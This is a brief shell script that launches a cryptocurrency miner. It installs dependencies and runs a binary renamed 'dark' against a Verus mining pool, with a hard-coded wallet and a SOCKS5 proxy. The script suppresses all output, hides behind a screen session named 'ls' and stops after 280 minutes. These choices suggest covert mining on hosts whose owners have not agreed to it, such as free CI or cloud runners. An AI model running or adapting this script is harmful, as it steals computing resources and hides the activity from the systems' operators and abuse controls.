#!/bin/sh
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x dark
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
PROXY=socks5://192.252.209.155:14455
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-PRANKENSTAINT)
timeout 280m ./dark -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
echo Sukses